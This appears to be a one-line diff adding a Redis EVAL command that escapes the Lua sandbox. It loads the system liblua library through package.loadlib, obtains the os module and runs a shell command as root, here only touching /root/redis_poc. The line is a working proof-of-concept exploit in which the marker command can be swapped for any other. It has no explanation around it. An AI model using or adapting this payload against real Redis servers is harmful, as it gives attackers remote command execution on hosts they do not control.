@@ -1,0 +1,1 @@
+eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /root/redis_poc"); return 0' 0
